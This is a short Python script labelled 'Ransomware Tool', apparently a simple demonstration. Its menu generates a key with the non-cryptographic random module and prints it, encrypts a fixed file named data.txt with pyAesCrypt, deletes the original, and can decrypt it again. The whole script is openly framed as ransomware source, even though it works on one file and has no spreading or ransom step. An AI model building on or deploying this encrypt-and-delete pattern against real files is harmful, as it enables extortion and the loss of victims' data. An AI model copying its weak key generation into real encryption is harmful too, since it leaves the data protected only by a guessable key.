#Import Libraries
import pyAesCrypt
import string
import random
import os

#Define Functions
def clear():
  os.system('clear')

def int_input_getter(prompt, num_range):
    while True:
        # Test for errors.
        try:
            choice = int(input(prompt))
        # If there is a value error pass so the loop can restart.
        except ValueError:
            pass
        # Otherwise, test to see if the number chosen is available.
        else:
            # If the number is available then return that number.
            if choice in num_range:
                return choice
            else:
                print("That is not an option!")
                input("Press enter to continue...")
def gen_key():
  #Generate Symmetric Key & Store in Variable
  clear()
  global sym
  passwd=''
  for i in range (15):
    nums = string.digits
    passwd+=random.choice(nums)
  for i in range (15):
    letters = string.ascii_letters
    passwd+=random.choice(letters)
  l=list(passwd)
  random.shuffle(l)
  sym= ''.join(l)
  print("Symmetric Key is: " + sym)
  print()

def encrypt():
  #Encrypt File
  clear()
  global bufferSize
  bufferSize = 64 * 1024
  pyAesCrypt.encryptFile("data.txt", "data.txt.aes", sym, bufferSize)

  #Delete Original
  os.remove("data.txt")
  print("Data is now encrypted")
  print()


def decrypt():
  #Decrypt File
  pyAesCrypt.decryptFile("data.txt.aes", "data.txt", sym, bufferSize)
  os.remove("data.txt.aes")



#Main Program
main_menu = """Ransomware Tool
1. Gen-key
2. Encrypt
3. Decrypt
4. Quit
"""
while True:
    uio = int_input_getter(main_menu, range(1, 5))
    if uio == 1:
        gen_key()
    elif uio == 2:
        encrypt()
    elif uio == 3:
        decrypt()
    else:
        exit(0)
